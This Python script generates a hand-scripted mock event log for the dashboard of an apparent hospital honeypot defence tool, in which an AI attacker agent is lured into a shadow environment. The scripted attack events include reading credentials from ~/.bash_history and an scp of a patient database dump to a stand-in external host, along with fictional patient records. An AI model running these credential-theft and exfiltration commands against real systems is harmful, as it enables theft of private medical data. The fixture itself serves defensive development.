"""Generate fixtures/demo-run.jsonl — a realistic, hand-scripted ~2-minute attack story.

This is MOCK data for building the UI before the backend exists. It is clearly labelled
(model="scripted", run_id starts with "fixture-") and must never be presented as a real run.

Run:  cd backend && uv run python ../scripts/make_fixture.py
"""

from __future__ import annotations

import random
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "backend"))

from mayajaal.contracts import make_event, load_world  # noqa: E402

random.seed(7)
WORLD = load_world()
HOSPITALS = [h["id"] for h in WORLD["hospitals"]]
RUN = "fixture-demo-001"
ATK = "sess-7f3a"
T0 = 1_763_150_400_000  # fixed epoch ms so the file is stable
events = []


def ev(t: float, type_, data, **kw):
    kw.setdefault("run_id", RUN)
    events.append(make_event(type_, data, ts=T0 + int(t * 1000), seq=0, **kw))


def atk(t, type_, data, tier="none", hospital_id="eas"):
    ev(t, type_, data, actor="attacker", session_id=ATK, tier=tier, hospital_id=hospital_id)


def sysev(t, type_, data, hospital_id=None, tier="none", actor="system"):
    ev(t, type_, data, actor=actor, hospital_id=hospital_id, tier=tier)


def defend(t, type_, data, tier="none", hospital_id="eas"):
    ev(t, type_, data, actor="defender", session_id=ATK, tier=tier, hospital_id=hospital_id)


def intent(t, benign, recon, exfil, tamper, disrupt, stage, evidence):
    total = benign + recon + exfil + tamper + disrupt
    post = {k: round(v / total, 3) for k, v in
            dict(benign=benign, recon=recon, exfil=exfil, tamper=tamper, disrupt=disrupt).items()}
    top = max(post, key=post.get)
    defend(t, "intent.update", dict(posterior=post, top_goal=top, stage=stage, evidence=evidence))


# ------------------------------------------------------------ opening state
sysev(0, "run.started", dict(mission="exfil", config="mayajaal", model="scripted",
                             attacker_label="fixture-red-01", live=False))
for i, h in enumerate(HOSPITALS):
    sysev(0.1, "node.status", dict(status="healthy", reason=""), hospital_id=h)
    sysev(0.1, "keyshare.status", dict(share_index=i + 1, state="safe", shares_captured_total=0, threshold=3),
          hospital_id=h)
defend(0.2, "canary.check", dict(protected_total=12, leaked=0))
sysev(0.2, "continuity.stats", dict(stat_on_time_pct=98.0, urgent_on_time_pct=97.0,
                                    routine_on_time_pct=99.0, unservable=0))
intent(0.3, 70, 10, 8, 6, 6, "recon", "New session from a valid nurse credential.")

# ------------------------------------------------------------ background clinician traffic
CLIN_PATHS = ["/fhir/Patient/{mrn}", "/fhir/Observation?patient={mrn}&code=718-7",
              "/fhir/DiagnosticReport?patient={mrn}", "/fhir/MedicationRequest?patient={mrn}"]
t = 1.0
while t < 125:
    h = random.choice(HOSPITALS[:5])
    path = random.choice(CLIN_PATHS).format(mrn=f"MRN-{random.randint(100000, 999999)}")
    sess = f"clin-{random.randint(10, 99)}"
    ev(t, "request", dict(method="GET", path=path, surface="fhir", status=200,
                          bytes=random.randint(800, 6000), technique=None),
       actor="clinician", session_id=sess, hospital_id=h, tier="real")
    ev(t + 0.05, "policy.decision", dict(lane="normal", action="allow_real", reason="Clinician read within care team."),
       actor="defender", session_id=sess, hospital_id=h, tier="real")
    t += random.uniform(2.5, 5.5)

# ------------------------------------------------------------ the attack
atk(2.5, "agent.thought", dict(text="I have credentials for n.okafor, a night-shift nurse at Eastbank Community. "
                                     "First, map what this account can reach."))
atk(4.0, "agent.tool_call", dict(tool="http", input="GET /fhir/Patient?_count=20"))
atk(4.4, "request", dict(method="GET", path="/fhir/Patient?_count=20", surface="fhir", status=200, bytes=18432,
                         technique="T1087"), tier="real")
defend(4.5, "policy.decision", dict(lane="normal", action="allow_real", reason="Ward list read; within nurse role."),
       tier="real")
atk(4.8, "agent.tool_result", dict(output_preview='{"resourceType":"Bundle","total":20,"entry":[{"resource":'
                                                  '{"resourceType":"Patient","id":"MRN-418230"...', bytes=18432),
    tier="real")
intent(5.2, 55, 25, 10, 5, 5, "recon", "Ward-sized patient list. Still consistent with a nurse.")

atk(8.0, "agent.thought", dict(text="Only 20 patients — her ward. I need broader access. Try the admin portal."))
atk(9.0, "agent.tool_call", dict(tool="http", input="GET /portal/admin/users"))
atk(9.3, "request", dict(method="GET", path="/portal/admin/users", surface="portal", status=403, bytes=312,
                         technique="T1087.002"), tier="real")
defend(9.4, "policy.decision", dict(lane="suspicious", action="deny",
                                    reason="Nurse role requesting admin user list."), tier="real")
intent(9.8, 30, 45, 12, 7, 6, "recon", "Admin enumeration from a clinical account.")

atk(13.0, "agent.thought", dict(text="Blocked. The IT wiki mentioned a jump box for night-shift printer fixes. "
                                      "Nurses sometimes have SSH there."))
atk(15.0, "agent.tool_call", dict(tool="shell", input="ssh n.okafor@jump.eas.meridian.local"))
defend(15.3, "policy.decision", dict(lane="suspicious", action="divert_shadow",
                                     reason="Interactive shell from a nurse account has no clinical use."),
       tier="shadow")
defend(15.4, "session.diverted", dict(from_tier="real", to_tier="shadow",
                                      reason="Suspicious lane + non-clinical surface."), tier="shadow")
atk(15.5, "request", dict(method="SSH", path="jump.eas.meridian.local", surface="shell", status=200, bytes=0,
                          technique="T1021.004"), tier="shadow")
for i, (kind, where) in enumerate([("credential", "~/.bash_history"),
                                    ("file", "/mnt/backups/db_dump_2026-11-13.sql.gz"),
                                    ("mrn", "MRN-7F3A-0193 (inside dump)")]):
    defend(15.7 + i * 0.2, "honeytoken.minted", dict(token_id=f"ht-7f3a-{i + 1}", kind=kind, placed_at=where),
           tier="shadow")
atk(16.2, "agent.tool_result", dict(output_preview="Last login: Fri Nov 13 23:41:07 2026 from 10.40.2.17\n"
                                                   "n.okafor@jump-eas:~$", bytes=64), tier="shadow")

atk(18.0, "agent.tool_call", dict(tool="shell", input="ls -la ~ && cat ~/.bash_history | tail -20"))
atk(18.3, "request", dict(method="EXEC", path="cat ~/.bash_history", surface="shell", status=200, bytes=1290,
                          technique="T1552.003"), tier="shadow")
atk(18.8, "agent.tool_result", dict(
    output_preview="lpstat -p\nsudo systemctl restart cups\nmount -t cifs //lum-backup01/nightly /mnt/backups "
                   "-o user=svc_lisbackup,pass=Lumen#Night2026\nls /mnt/backups\n...", bytes=1290), tier="shadow")
defend(19.2, "honeytoken.touched", dict(token_id="ht-7f3a-1", kind="credential", where="~/.bash_history"),
       tier="shadow")
intent(19.6, 12, 30, 40, 10, 8, "access", "Read credential-bearing shell history.")
defend(21.0, "breadcrumb.planted", dict(kind="backup_share", path="/mnt/backups", info_gain=0.62,
                                        target_goals=["exfil", "disrupt"]), tier="shadow")

atk(24.0, "agent.thought", dict(text="A service account for the shared pathology backups, in plaintext. "
                                      "Mount it and look."))
atk(26.0, "agent.tool_call", dict(tool="shell", input="ls -lh /mnt/backups"))
atk(26.3, "request", dict(method="EXEC", path="ls -lh /mnt/backups", surface="shell", status=200, bytes=640,
                          technique="T1083"), tier="shadow")
atk(26.8, "agent.tool_result", dict(
    output_preview="-rw-r----- 1 svc_lisbackup lis  47M Nov 13 02:10 db_dump_2026-11-13.sql.gz\n"
                   "-rw-r----- 1 svc_lisbackup lis  46M Nov 12 02:09 db_dump_2026-11-12.sql.gz\n"
                   "-rw-r----- 1 svc_lisbackup lis 3.1M Nov 13 02:11 lis_results_export.csv\n"
                   "drwxr-x--- 2 svc_lisbackup lis 4.0K Nov 01 09:00 research_cohort_q4/", bytes=640), tier="shadow")
intent(27.5, 8, 22, 52, 10, 8, "collect", "Listing backup archives.")

atk(30.0, "agent.thought", dict(text="Nightly EHR dumps covering every hospital in the city. This is the jackpot."))
atk(33.0, "agent.tool_call", dict(tool="shell", input="zcat /mnt/backups/db_dump_2026-11-13.sql.gz | head -40"))
atk(33.4, "request", dict(method="EXEC", path="zcat db_dump_2026-11-13.sql.gz", surface="shell", status=200,
                          bytes=5120, technique="T1005"), tier="shadow")
atk(34.0, "agent.tool_result", dict(
    output_preview="COPY patients (mrn, name, dob, hospital, dx) FROM stdin;\n"
                   "MRN-7F3A-0193\tAmara Lindqvist\t1961-04-02\taur\tE11.9 Type 2 diabetes\n"
                   "MRN-7F3A-0194\tDev Raman\t1978-09-15\tnor\tI10 Hypertension\n...", bytes=5120), tier="shadow")
defend(34.4, "honeytoken.touched", dict(token_id="ht-7f3a-2", kind="file", where="db_dump_2026-11-13.sql.gz"),
       tier="shadow")
intent(36.0, 5, 15, 66, 8, 6, "collect", "Reading bulk patient dump.")

defend(42.0, "breadcrumb.planted", dict(kind="research_dataset", path="/mnt/backups/research_cohort_q4/",
                                        info_gain=0.41, target_goals=["exfil", "tamper"]), tier="shadow")
atk(46.0, "agent.thought", dict(text="Check the live API too, in case the dump is stale."))
atk(48.0, "agent.tool_call", dict(tool="http",
                                  input="GET /fhir/Patient?_count=1000&_elements=name,birthDate,identifier"))
defend(48.2, "policy.decision", dict(lane="attacker", action="divert_shadow",
                                     reason="Bulk export (1000) from a diverted session."), tier="shadow")
atk(48.5, "request", dict(method="GET", path="/fhir/Patient?_count=1000", surface="fhir", status=200,
                          bytes=2_150_000, technique="T1119"), tier="shadow")
intent(49.0, 3, 10, 76, 6, 5, "collect", "Bulk FHIR export.")

atk(54.0, "agent.tool_call", dict(tool="shell",
                                  input="scp /mnt/backups/db_dump_2026-11-13.sql.gz drop@203.0.113.50:/loot/"))
atk(54.4, "request", dict(method="EXEC", path="scp db_dump_2026-11-13.sql.gz -> 203.0.113.50", surface="shell",
                          status=200, bytes=48_900_000, technique="T1041"), tier="shadow")
SAMPLE = [
    ("MRN-7F3A-0193", "Amara Lindqvist", "1961-04-02", "aur", "HbA1c 7.9 %, metformin 1 g BID"),
    ("MRN-7F3A-0194", "Dev Raman", "1978-09-15", "nor", "BP 152/94, lisinopril 10 mg"),
    ("MRN-7F3A-0195", "Lucía Ferreyra", "1990-12-01", "riv", "Hb 9.8 g/dL, iron studies pending"),
    ("MRN-7F3A-0196", "Tomasz Wierzbicki", "1955-07-23", "wes", "Troponin I 0.03 ng/mL, post-PCI"),
    ("MRN-7F3A-0197", "Ifeoma Chukwu", "1984-02-11", "eas", "Crossmatch 2 units, scheduled C-section"),
]
atk(56.0, "exfil", dict(records=4812, bytes=48_900_000, artifact="/mnt/backups/db_dump_2026-11-13.sql.gz",
                        sample=[dict(mrn=m, name=n, dob=d, hospital_id=h, detail=x) for m, n, d, h, x in SAMPLE]),
    tier="shadow")
defend(56.3, "honeytoken.touched", dict(token_id="ht-7f3a-3", kind="mrn", where="exfiltrated dump"), tier="shadow")
defend(56.5, "canary.check", dict(protected_total=12, leaked=0))
intent(57.0, 2, 6, 86, 3, 3, "act", "Exfiltration to an external host.")

atk(61.0, "agent.thought", dict(text="Transfer complete. Mission accomplished."))
atk(62.0, "agent.claim", dict(text="Exfiltrated 4,812 patient records (MRNs, DOBs, diagnoses, labs) from "
                                    "Meridian City's nightly EHR backups."))
defend(64.0, "reveal", dict(shadow_session="7f3a", real_bytes=0, records_faked=4812, honeytokens_touched=3),
       tier="shadow")

# ------------------------------------------------------------ Synnovis-style outage (system scenario)
sysev(74.0, "node.status", dict(status="compromised", reason="Ransomware encrypting LIS servers (simulated)."),
      hospital_id="lum")
sysev(74.5, "keyshare.status", dict(share_index=6, state="captured", shares_captured_total=1, threshold=3),
      hospital_id="lum")
sysev(76.0, "node.status", dict(status="quarantined", reason="Isolated from the Jaal; links cut."), hospital_id="lum")
sysev(76.5, "continuity.stats", dict(stat_on_time_pct=61.0, urgent_on_time_pct=58.0, routine_on_time_pct=40.0,
                                     unservable=0))

TESTS = {"stat": ["Crossmatch", "Troponin I", "Lactate", "Potassium"],
         "urgent": ["CBC", "INR", "Blood culture"], "routine": ["Lipid panel", "HbA1c", "Vitamin D"]}
CAP_TARGET = {"riv": ["aur", "wes"], "aur": ["nor", "aur"], "nor": ["nor"], "eas": ["aur", "nor"],
              "wes": ["wes", "aur"]}
t = 78.0
n = 0
for urg, count in (("stat", 9), ("urgent", 8), ("routine", 9)):
    for _ in range(count):
        n += 1
        frm = random.choice(["aur", "riv", "nor", "eas", "wes"])
        oid = f"LAB-{4100 + n}"
        test = random.choice(TESTS[urg])
        sysev(t, "lab.order", dict(order_id=oid, urgency=urg, test=test, from_hospital=frm, to_hospital=None,
                                   status="queued", eta_min=None), hospital_id=frm)
        if urg == "routine" and n % 3 == 0:
            sysev(t + 1.2, "lab.order", dict(order_id=oid, urgency=urg, test=test, from_hospital=frm,
                                             to_hospital=None, status="unservable", eta_min=None), hospital_id=frm)
        else:
            to = random.choice(CAP_TARGET[frm])
            eta = round({"stat": 35, "urgent": 70, "routine": 180}[urg] * random.uniform(0.6, 1.0), 0)
            sysev(t + 1.2, "lab.order", dict(order_id=oid, urgency=urg, test=test, from_hospital=frm,
                                             to_hospital=to, status="rerouted", eta_min=eta), hospital_id=frm)
            sysev(t + 9 + random.uniform(0, 8), "lab.order",
                  dict(order_id=oid, urgency=urg, test=test, from_hospital=frm, to_hospital=to,
                       status="completed", eta_min=0), hospital_id=to)
        t += 0.9

for i, (s, u, r, x) in enumerate([(78, 72, 55, 1), (89, 84, 66, 2), (94, 90, 70, 3)]):
    sysev(90 + i * 8, "continuity.stats", dict(stat_on_time_pct=float(s), urgent_on_time_pct=float(u),
                                               routine_on_time_pct=float(r), unservable=x))

sysev(122.0, "run.ended", dict(outcome=dict(believed_success=True, secrets_leaked=0, suspected_honeypot=False,
                                            mission_won=False),
                               summary="Agent believed it exfiltrated 4,812 records; all came from shadow "
                                       "session 7f3a. 0/12 protected canaries leaked. STAT on-time recovered "
                                       "to 94% during the Lumen outage.",
                               duration_s=122.0))

# ------------------------------------------------------------ write
events.sort(key=lambda e: e.ts)
for i, e in enumerate(events, 1):
    e.seq = i
out = ROOT / "fixtures" / "demo-run.jsonl"
out.write_text("".join(e.to_json() + "\n" for e in events))
print(f"wrote {len(events)} events to {out}")
